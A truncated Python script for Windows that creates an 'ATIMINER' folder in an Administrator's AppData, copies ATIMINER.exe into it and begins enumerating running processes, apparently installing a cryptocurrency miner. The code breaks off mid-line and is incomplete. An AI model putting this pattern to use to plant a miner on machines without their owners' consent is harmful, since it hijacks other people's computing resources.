import ctypes
ctypes.windll.user32.SetProcessDPIAware()

from psutil import *
import os
import time
import win32gui
import win32con

mainpath = "C:/Users/Administrator/AppData/Local/ATIMINER"
if not os.path.exists(mainpath):
    os.makedirs(mainpath)

time.sleep(1)

myapp = "ATIMINER"
app_path = mainpath + "/" + myapp + ".exe"
file_path = os.getcwd() + '\\' + myapp + '.exe'

w1 = win32gui.FindWindow(None, 'ATIMINER')
win32gui.SetForegroundWindow(w1)

time.sleep(2)

with open(app_path, "wb") as f:
    f.write(open(file_path, "rb").read())

pids = []


for p in process_iter():
    try:
        pinfo = p.as_dict(attrs=['pid', 'name', 'create_time
